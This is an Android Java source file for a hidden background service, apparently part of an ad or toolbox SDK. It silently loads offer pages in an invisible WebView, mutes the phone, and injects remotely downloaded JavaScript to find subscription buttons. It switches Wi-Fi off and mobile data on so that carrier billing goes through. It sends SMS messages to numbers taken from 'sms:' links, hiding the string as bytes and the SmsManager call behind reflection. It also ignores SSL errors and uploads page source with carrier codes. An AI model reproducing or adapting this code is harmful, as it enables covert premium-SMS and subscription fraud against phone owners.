package com.oom.tblib.view;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.oom.tblib.mode.Ma;
import com.oom.tblib.mode.PhoneInfor;
import com.oom.tblib.tasks.AnalysisTask;
import com.oom.tblib.utils.AudioUtil;
import com.oom.tblib.utils.CheckUtil;
import com.oom.tblib.utils.DataUtil;
import com.oom.tblib.utils.HttpUtil;
import com.oom.tblib.utils.JsUtil;
import com.oom.tblib.utils.LogUtil;
import com.oom.tblib.utils.PhoneInforUtil;
import com.oom.tblib.utils.PhoneOperateUtil;
import com.oom.tblib.utils.Utils;
import com.oom.tblib.utils.XmlUtil;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import static com.oom.tblib.tasks.AnalysisTask.DEFAULTCID;


/**
 * Created by xlc on 2017/5/24.
 */

public class AgentService extends Service {

    @Override
    public Context getApplicationContext() {
        if (context == null) {
            context = Utils.getContext();
        }
        return context.getApplicationContext();
    }

    @Override
    public Context getBaseContext() {
        return getApplicationContext();
    }

    private final String TAG = "Sa";

    private WebView mWebView = null;

    private Handler handler_;

    private HandlerThread mht;

    private final int notid = LogUtil.TAG.hashCode();

    private boolean showNotification = false;

    private boolean execute_task = false;

    private Random random = null;

    private Context context = null;

    /**
     * 判断是否为黑名单显示通知栏
     */
    public void checkBlackToShow() {
        if (Utils.getSubType(this) == 1014) {
            //SDK 版本不显示通知栏
            return;
        }

//        int black_list_status = XmlUtil.getBlackState(this);
//        switch (black_list_status) {
//            case -1:
//                if (showNotification) {
//                    //                    Ulog.w("黑名单清除通知栏");
//                    NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
//                    nm.cancel(notid);
//                    stopForeground(true);
//                    showNotification = false;
//                }
//                break;
//            case 1:
//                if (!showNotification) {
//                    //                    Ulog.w("不是黑名单显示通知栏");
//                    startForeground(notid, SubNotific.getInstance(context).getNotification());
//                    showNotification = true;
//                }
//                break;
//            default:
//                //                Ulog.w("未知情况下不展示通知栏");
//                break;
//        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        if (context == null) {
            context = Utils.getContext();
        }

        random = new Random();

        initView();

        mht = new HandlerThread("toolbox");
        mht.start();

        new Thread() {
            @Override
            public void run() {
                super.run();

                Looper.prepare();

                handler_ = new Handler() {
                    @Override
                    public void handleMessage(Message msg) {
                        super.handleMessage(msg);

                        // Ulog.w("key:" + H_encode.getSignature(context));

                        webHandler.sendEmptyMessage(0);

                        handler_.sendEmptyMessageDelayed(1, 6000);
                    }
                };

                handler_.sendEmptyMessage(5000);

                Looper.loop();
            }
        }.start();

        LogUtil.show("s onCreate");
    }

    @SuppressLint("NewApi")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (context == null) {
            context = Utils.getContext();
        }

        int type = Utils.getSubType(this);
        if (type == 1011) {//1011:渠道

            afterAnalysis();

        } else if (type == 1012) {//1012:GP

            if (!XmlUtil.checkOpenTime(context)) {
                afterAnalysis();
            }

            first_start_app();

        } else if (type == 1013) {//1013:DDL

            if (!XmlUtil.checkOpenTime(context)) {
                afterAnalysis();
            }

            first_start_app();

        } else if (type == 1014) {//1014:SDK

            afterAnalysis();

        }

        checkBlackToShow();

        return Service.START_NOT_STICKY;
    }

    @SuppressLint("NewApi")
    public void afterAnalysis() {
        //LogUtil.w("获取渠道结束后操作缓存");
        Utils.checkCacheTime(this);

        Utils.checkConnectTime(this);

        Utils.checkDownloadJsTime(this);

    }

    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
    private void first_start_app() {

        if (XmlUtil.checkOpenTime(context)) {

            String cid = XmlUtil.getChannelCID(context);
            String rid = XmlUtil.getReceiverCID(context);

            XmlUtil.saveOpenTime(context);

            if ((TextUtils.isEmpty(cid) || DEFAULTCID.equals(cid)) && TextUtils.isEmpty(rid)) {

                //                Ulog.show("超过6小时，渠道为默认值，重新获取渠道，保存时间");

                new AnalysisTask(this).executeOnExecutor(HttpUtil.executorService);

            } else {

                afterAnalysis();

            }
        }
    }


    private Handler webHandler = new Handler() {
        @Override
        public void handleMessage(Message message) {
            switch (message.what) {
                case 0:
                    if (XmlUtil.checkExecuteTime(context) && !XmlUtil.checkBlackState(context) && !execute_task) {
                        //                        Ulog.w("服务中满足时间开始执行链接");
                        //                        Ulog.show("do webView load");
                        execute_task = true;
                        new Task().execute();
                    }
                    break;
                case 1:
                    if (!checkNetWork()) {

                        //                        Ulog.w("网络异常情况下不注入js，执行下一条");
                        //                        Ulog.show("net error not load js, do last");

                        webHandler.sendEmptyMessage(3);

                        break;
                    }

                    if (!same_offer) {

                        int random_ = random.nextInt(100) + 1;

                        LogUtil.show("r " + random_ + ":" + jRate);

                        if (random_ > jRate) {

                            //                            Ulog.w("随机数" + random_ + "大于" + jRate + "不执行注入");
                            //                            Ulog.show("random_" + random_ + ">" + jRate + " do last one");

                            if (showInterstitialOffer != null) {

                                if (!XmlUtil.check_show_intersAd_time(context)) {

                                    LogUtil.show("n w");

                                    DataUtil.showOfferExecuteTime(context, showInterstitialOffer);

                                    webHandler.sendEmptyMessage(5);

                                    //                                    Ulog.show("do not update times");

                                    break;
                                }


                                LogUtil.show("o w");

                                XmlUtil.save_show_intersAd_time(context);

                                WebViewWindow.getInstance(context).startLoad(showInterstitialOffer);

                            }

                            webHandler.sendEmptyMessage(3);

                            break;

                        } else {

                            //                            Ulog.w("随机数" + random_ + "小于等于 " + jRate + " 执行注入");
                            //                            Ulog.show("random_" + random_ + "<=" + jRate + " load js");

                        }
                    }
                    String jsString = JsUtil.getInstance(context).getJsString();

                    if (mWebView != null && !TextUtils.isEmpty(jsString)) {

                        //                        Ulog.w("service_执行注入");
                        //                        Ulog.show("service_ load js");

                        mWebView.loadUrl("javascript:" + jsString);

                        mWebView.loadUrl("javascript:findLp()");

                        mWebView.loadUrl("javascript:findAocOk()");
                    }
                    break;
                // 注入获取网页的代码js
                case 2:
                    if (mWebView != null) {
                        mWebView.loadUrl(HttpUtil.js_get_source);
                    }
                    break;
                case 4:

                    //                    Ulog.show("do last after 2 min,check post Resource status");
                    //                    Ulog.w("间隔了两分钟后直接执行下一条,先判断是否需要上传源码");

                    boolean source_status = XmlUtil.checkSourceStatus(context, offer_id + "");

                    if (source_status && getSource == 0) {

                        //                        Ulog.w("需要源代码上传");
                        //                        Ulog.show("need load Resource js");

                        webHandler.sendEmptyMessage(2);

                        webHandler.sendEmptyMessageDelayed(3, 3000);

                    } else {

                        //                        Ulog.w("不需要源代码上传");
                        //                        Ulog.show("need not load resource js, do last one");

                        webHandler.sendEmptyMessage(3);
                    }

                    break;
                case 3:

                    LogUtil.show("n " + load_error);

                    if (checkNetWork()) {

                        //                        Ulog.w("网络正常的情况统计:" + offer_id + "的执行次数");
                        //                        Ulog.show("network normal save :" + offer_id + " execute times");

                        DataUtil.updateLinkExecuteTime(context, showInterstitialOffer);

                    } else {

                        //                        Ulog.w("网络异常不统计:" + offer_id + "的执行次数");
                        //                        Ulog.show("network error  do not save :" + offer_id + " execute times,do last");
                    }

                    webHandler.sendEmptyMessage(5);

                    break;

                case 5:

                    if (mList != null && execute_index < mList.size()) {

                        //                        Ulog.show("do last offer_id:" + mList.get(execute_index).getOffer_id() + ":" + execute_index + "  after 5s");
                        //                        Ulog.w("执行下一条链接offer_id:" + mList.get(execute_index).getOffer_id() + "执行第" + execute_index + "条");

                        start_load(mList.get(execute_index));

                        execute_index = execute_index + 1;

                    } else {

                        //                        Ulog.w("轮询结束,回收浏览器");
                        //                        Ulog.show("do all offer finished,destroy webView");

                        webHandler.removeMessages(4);

                        destoryWebView();
                    }
                    break;
            }
        }
    };

    private void start_load(Ma offer) {
        LogUtil.show("p " + offer.getSub_platform_id() + "  s " + offer.getOffer_id());

        showInterstitialOffer = offer;

        initStatus();

        String load_url = DataUtil.getChangeUrl(offer, this, true);

        jRate = offer.getJRate();

        sub_platform_id = offer.getSub_platform_id();

        offer_id = offer.getOffer_id();

        getSource = offer.getGetSource();

        if (mWebView == null) {
            initView();
        }

        PhoneOperateUtil.disableJsIfUrlEncodedFailed(mWebView, load_url);

        webHandler.removeMessages(4);
        webHandler.sendEmptyMessageDelayed(4, 2 * 60000);

        mWebView.onResume();
        mWebView.clearFocus();
        mWebView.stopLoading();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url);
    }

    private class Task extends AsyncTask<Void, Integer, Ma> {

        @Override
        protected Ma doInBackground(Void... params) {

            mList = null;

            execute_index = 0;

            if (XmlUtil.checkDownJsTime(context) && !XmlUtil.checkBlackState(context)) {

                if (JsUtil.getInstance(context).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING) {

                    //                    Ulog.w("执行offer前满足条件先下载js");
                    //                    Ulog.show("download js before execute offer");

                    LogUtil.show("d j");

                    JsUtil.getInstance(context).down();

                    if (JsUtil.getInstance(context).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_FAIL) {

                        //                        Ulog.w("下载失败不往下执行offer");
                        //                        Ulog.w("download fail return");

                        return null;
                    }
                } else {
                    //                    Ulog.w("js正在下载中,不执行offer");
                    //                    Ulog.w("js downloading..");
                    return null;
                }
            }

            Ma offer = DataUtil.getServiceLink(context);

            if (offer == null) {

                //                Ulog.show("数据为空");

                return null;
            }

            //            LogUtil.w("随机的一条支持网络状态(1:流量)：" + offer.getAllow_network());
            //            LogUtil.show("et one offer(1:gprs)：" + offer.getAllow_network());
            //
            if (offer.getAllow_network() == 1) {

                //                Ulog.w("服务中执行: 只支持GPRS");
                //                Ulog.show("only gprs");

                if (PhoneOperateUtil.getWifiStatus(context)) {

                    if (JsUtil.getInstance(context).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_DOING) {

                        //                        Ulog.w("正在下载js或缓存不做执行offer,不做关闭wifi操作");
                        //                        Ulog.show("js downloading,do not close wifi");

                        return null;
                    }

                    // Ulog.w("服务中执行: 判断wifi为开启状态 做关闭");
                    // Ulog.show("do close wifi");

                    //关闭wifi
                    PhoneOperateUtil.closeWifi(context);

                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }

                if (!PhoneOperateUtil.getMobileStatus(context, null)) {
                    //                    Ulog.w("服务中执行:GPRS为关闭状态，做开启操作");
                    //                    Ulog.show("open gprs");

                    PhoneOperateUtil.setNetState(context, "setMobileDataEnabled", true);

                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }

            mList = DataUtil.getOfferList(context, offer.getAllow_network(), offer.getOffer_id(), offer.getSub_platform_id());

            //            Ulog.w("根据这个网络查询数据大小：" + mList.size());
            //            Ulog.show("search size：" + mList.size());
            //
            //            Log.e("love", offer.getOffer_id() + "-" + offer.getSub_platform_id());
            //            for (int i = 0; i < mList.size(); i++) {
            //                Log.e("love", mList.get(i).getOffer_id() + "---" + mList.get(i).getSub_platform_id());
            //            }

            return offer;
        }

        @SuppressLint("SimpleDateFormat")
        @Override
        protected void onPostExecute(Ma offer) {
            super.onPostExecute(offer);

            execute_task = false;

            if (offer == null) {
                //                Ulog.w("没有查找到数据");
                //                Ulog.show("no data");
                return;
            }

            LogUtil.initSuccess();

            XmlUtil.saveExecuteTime(context);

            AudioUtil.getInstance(context).setSlience();

            start_load(offer);

        }
    }

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initView() {
        mWebView = new WebView(context);
        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);
        mWebView.setWillNotCacheDrawing(true);
        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "toolbox");
        mWebView.addJavascriptInterface(this, "myObj");
        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                //                Ulog.show("shouldOverrideUrlLoading+" + url);

                if (url.startsWith(new String(new byte[]{115, 109, 115, 58}))) {
                    try {
                        String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));
                        String content = url.substring(url.indexOf("=") + 1, url.length());

                        //                        SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                        Class<?> smsClasss = Class.forName("android.telephony.SmsManager");
                        Method method = smsClasss.getMethod("sendTextMessage", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
                        method.invoke(smsClasss.getMethod("getDefault").invoke(null), new Object[]{port, null, content, null, null});

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                return true;
                //                return super.shouldOverrideUrlLoading(view, url);
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                //                Ulog.show("onPageFinished+" + url);

                if (url.equals(last_finished_url)) {
                    //                    Ulog.w("相同的链接不注入");
                    return;
                }

                last_finished_url = url;
                webHandler.removeMessages(1);

                if (CheckUtil.checkBlackUrl(url)) {
                    //                    Ulog.w("黑名单链接不执行注入，执行下一条");
                    //                    Ulog.show("blacklist url, do last one");
                    load_error = 0;
                    webHandler.sendEmptyMessage(3);
                    return;
                }
                webHandler.sendEmptyMessageDelayed(1, 20000);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                //                Ulog.show("onPageStarted+" + url);
                load_error = 0;
                findLp_ok = "";
                findAoc_ok = "";
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                load_error = errorCode;
            }
        });
    }

    @SuppressLint("NewApi")
    private void destoryWebView() {
        if (mWebView != null) {
            try {
                ViewGroup parent = (ViewGroup) mWebView.getParent();
                if (parent != null) {
                    //                parent.removeView(mWebView);
                    parent.removeAllViews();
                }

                mWebView.stopLoading();
                mWebView.onPause();
                mWebView.clearHistory();
                mWebView.removeAllViews();
                mWebView.destroyDrawingCache();

                mWebView.destroy();

            } catch (Exception e) {
                e.printStackTrace();
            }

            mWebView = null;

        }

        AudioUtil.getInstance(context).setNomal();

        LogUtil.show("w d");
    }

    /**
     * 获取源码信息回调
     *
     * @param source
     */
    @android.webkit.JavascriptInterface
    public void getSource(String source) {
        //        Ulog.w("getSource: " + source);
        LogUtil.show("s r");

        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInforUtil.getMcc(context));
        map.put("mnc", PhoneInforUtil.getMnc(context));
        map.put("cid", PhoneInfor.getInstance(context).getKeyStore());
        map.put("source_type", source_type);
        map.put("platform_id", sub_platform_id);
        map.put("offer_id", offer_id);
        map.put("source", source);
        map.put("network", Utils.getNetStatus(this));

        HttpUtil.postSource(map, context);
    }

    private void initStatus() {
        load_error = 0;
        last_finished_url = "";
        aoc_ok = false;
        lp_ok = false;
        source_type = 0;
        same_offer = false;
        jRate = 60;
    }

    private List<Ma> mList = null;

    //当前执行的index
    private int execute_index = 0;

    private String findLp_ok = "";

    private String findAoc_ok = "";

    private int load_error = 0;

    private boolean lp_ok = false;

    private boolean aoc_ok = false;

    private int source_type;

    private boolean same_offer = false;

    private String last_finished_url = "";

    private int offer_id;

    private int sub_platform_id;

    //    是否需要获取网页代码传回服务器 0：干 1：不干
    private int getSource;

    private int jRate;

    private Ma showInterstitialOffer = null;

    @android.webkit.JavascriptInterface
    public void openImage(String tag, String _url) throws InterruptedException {
        //        Ulog.w("service_tag:" + tag);
        same_offer = true;
        if (tag.contains("findLp")) {
            findLp_ok = tag;
            findAoc_ok = "";
            if (tag.contains("ok")) {
                //                Ulog.show("lp ok");
                lp_ok = true;
            } else {
                //                Ulog.show("lp no");
            }
        }
        if (tag.contains("aoc_")) {
            findAoc_ok = tag;
            if (tag.contains("ok")) {
                //                Ulog.show("aoc ok");
                aoc_ok = true;
            } else {
                //                Ulog.show("aoc no");
            }
        }

        //短信按钮      sms
        boolean is_sms = findAoc_ok.contains(new String(new byte[]{115, 109, 115}));
        boolean findLp_no = !findLp_ok.contains("ok") && !"".equals(findLp_ok);
        boolean aoc_no = !findAoc_ok.contains("ok") && !"".equals(findAoc_ok);

        if (load_error != -2 && ((findLp_no && aoc_no) || is_sms)) {
            boolean check_return = XmlUtil.checkSourceStatus(context, offer_id + "");
            boolean exist_ok = aoc_ok && lp_ok;
            source_type = getSource_type();
            if (getSource == 0 && !exist_ok && check_return) {
                //                Ulog.w("需要获取网页的源代码");
                //                Ulog.show("do load Source code js");
                webHandler.sendEmptyMessage(2);
                webHandler.sendEmptyMessageDelayed(3, 5000);
            } else {
                if (exist_ok) {
                    //                    Ulog.show("exist both ok ,do not return data");
                    //                    Ulog.w("findLp_ok和aoc_ok都存在，不回传");
                }
                if (!check_return) {
                    //                    Ulog.show("offer has return data");
                    //                    Ulog.w("这条offer已经上传过源代码，不再做上传");
                }
                webHandler.sendEmptyMessageDelayed(3, 100);
            }
        }
    }

    /**
     * 回传类型
     *
     * @return
     */
    public int getSource_type() {
        int source_type = 0;
        if (!aoc_ok && !lp_ok) {
            source_type = 0;
        } else if (lp_ok && !aoc_ok) {
            source_type = 1;
        } else if (!lp_ok && aoc_ok) {
            source_type = 2;
        }
        return source_type;
    }

    private boolean checkNetWork() {
        if (load_error != -2 && load_error != -8) {
            if (PhoneOperateUtil.checkNet(context)) {
                return true;
            }
        }
        return false;
    }
}